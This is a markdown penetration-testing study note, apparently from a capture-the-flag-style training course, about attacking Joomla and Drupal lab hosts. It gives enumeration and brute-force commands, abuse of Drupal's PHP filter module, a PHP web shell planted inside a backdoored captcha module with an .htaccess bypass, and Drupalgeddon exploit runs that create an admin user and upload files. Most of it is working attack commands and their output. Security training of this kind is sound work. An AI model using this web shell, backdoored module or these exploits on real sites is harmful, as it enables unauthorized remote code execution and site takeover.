# Attacking Common Applications
- [Joomla](#joomla)
    - [Enumeration](#enumeration)
- [Drupal](#drupal)
    - [Enumeration](#enumeration-1)
    - [PHP Filter Module](#php-filter-module)
    - [Uploading a Backdoored Module](#uploading-a-backdoored-module)
    - [Drupalgeddon](#drupalgeddon)

## Joomla
### Enumeration
- Fingerprint the version from JavaScript files in the `media/system/js/` directory or by browsing to `administrator/manifests/files/joomla.xml`
- The `cache.xml` file can help to give us the approximate version. It is located at `plugins/system/cache/cache.xml`

- [Droopescan](https://github.com/droope/droopescan), a plugin-based scanner that works for SilverStripe, WordPress, and Drupal with limited functionality for Joomla and Moodle.
```bash
sudo pip3 install droopescan

droopescan scan joomla --url http://dev.inlanefreight.local/
```
- We can also try out [JoomlaScan](https://github.com/drego85/JoomlaScan). However, JoomlaScan is a bit out-of-date and requires Python2.7 to run.
```bash
abdeonix@htb[/htb]$ curl https://pyenv.run | bash
abdeonix@htb[/htb]$ echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc
abdeonix@htb[/htb]$ echo 'command -v pyenv >/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrc
abdeonix@htb[/htb]$ echo 'eval "$(pyenv init -)"' >> ~/.bashrc
abdeonix@htb[/htb]$ source ~/.bashrc
abdeonix@htb[/htb]$ pyenv install 2.7
abdeonix@htb[/htb]$ pyenv shell 2.7

abdeonix@htb[/htb]$ python2.7 -m pip install urllib3
abdeonix@htb[/htb]$ python2.7 -m pip install certifi
abdeonix@htb[/htb]$ python2.7 -m pip install bs4

python2.7 joomlascan.py -u http://dev.inlanefreight.local


## bruteforcing default password using Joomla [bruteforce](https://github.com/ajnik/joomla-bruteforce)
sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```

## Drupal
### Enumeration
- We can identify Drupal CMS is through nodes. Drupal indexes its content using nodes. A node can hold anything such as a blog post, poll, article, etc. 
- The page URIs are usually of the form `/node/<nodeid>`
- Version
```bash
curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 

## Droopescan 
droopescan scan drupal -u http://drupal.inlanefreight.local
```
### PHP Filter Module
- In older versions of Drupal (before version 8), it was possible to log in as an admin and enable the PHP filter module, which "Allows embedded PHP code/snippets to be evaluated."

![Drupal_PHP_Module](/images/drupal_php_module.png)

- From here, we could tick the check box next to the module and scroll down to Save configuration. Next, we could go to Content --> Add content and create a Basic page.

![Basic_Page](/images/basic_page.png)

- We can now create a page with a malicious PHP snippet such as the one below.

![Basic_page_shell](/images/basic_page_shell_7v2.png)

- We also want to make sure to set Text format drop-down to PHP code. From version 8 onwards, the PHP Filter module is not installed by default. To leverage this functionality, we would have to install the module ourselves
```bash
abdeonix@htb[/htb]$ wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
```
- Once downloaded go to `Administration > Reports > Available updates`

> [!NOTE]
> Location may differ based on the Drupal version and may be under the Extend menu.

![Install_Module](/images/install_module.png)

- From here, click on Browse, select the file from the directory we downloaded it to, and then click Install.
- Once the module is installed, we can click on Content and create a new basic page, similar to how we did in the Drupal 7 example. Again, be sure to select PHP code from the Text format dropdown.

### Uploading a Backdoored Module
- Drupal allows users with appropriate permissions to upload a new module. A backdoored module can be created by adding a shell to an existing module.
- Modules can be found on the drupal.org website.
```bash
# Download the archive and extract its contents.
abdeonix@htb[/htb]$ wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
abdeonix@htb[/htb]$ tar xvf captcha-8.x-1.2.tar.gz
```
- Create a PHP web shell with the contents:

```php
<?php
system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']);
?>
```
- Next, we need to create a .htaccess file to give ourselves access to the folder. This is necessary as Drupal denies direct access to the /modules folder.

```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
- The configuration above will apply rules for the / folder when we request a file in /modules. Copy both of these files to the captcha folder and create an archive.
```bash
abdeonix@htb[/htb]$ mv shell.php .htaccess captcha
abdeonix@htb[/htb]$ tar cvf captcha.tar.gz captcha/

captcha/
captcha/.travis.yml
captcha/README.md
captcha/captcha.api.php
captcha/captcha.inc
captcha/captcha.info.yml
captcha/captcha.install

<SNIP>
```
- Assuming we have administrative access to the website, click on Manage and then Extend on the sidebar. 
- Next, click on the + Install new module button, and we will be taken to the install page, such as http://drupal.inlanefreight.local/admin/modules/install Browse to the backdoored Captcha archive and click Install.

![Module_Installed](/images/module_installed.png)

- Once the installation succeeds, browse to `/modules/captcha/shell.php` to execute commands.
```bash
abdeonix@htb[/htb]$ curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
### Drupalgeddon
- CVE-2014-3704, known as Drupalgeddon, affects versions 7.0 up to 7.31 and was fixed in version 7.32. This was a pre-authenticated SQL injection flaw that could be used to upload a malicious form or create a new admin user.
- This is [PoC](https://www.exploit-db.com/exploits/34992) script. Once an admin user is added, we could log in and enable the PHP Filter module to achieve remote code execution.
```bash
abdeonix@htb[/htb]$ python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd

<SNIP>

[!] VULNERABLE!

[!] Administrator user created!

[*] Login: hacker
[*] Pass: pwnd
[*] Url: http://drupal-qa.inlanefreight.local/?q=node&destination=node
```

- **Drupalgeddon2**
- We can use this [PoC](https://www.exploit-db.com/exploits/44448) to confirm this vulnerability.
```bash
abdeonix@htb[/htb]$ python3 drupalgeddon2.py 

################################################################
# Proof-Of-Concept for CVE-2018-7600
# by Vitalii Rudnykh
# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders
# https://github.com/a2u/CVE-2018-7600
################################################################
Provided only for educational or information purposes

Enter target url (example: https://domain.ltd/): http://drupal-dev.inlanefreight.local/

Check: http://drupal-dev.inlanefreight.local/hello.txt
```
- We can check quickly with `cURL` and see that the hello.txt file was indeed uploaded.
```bash
curl -s http://drupal-dev.inlanefreight.local/hello.txt

;-)
```

- Modify the script to gain remote code execution by uploading a malicious PHP file.
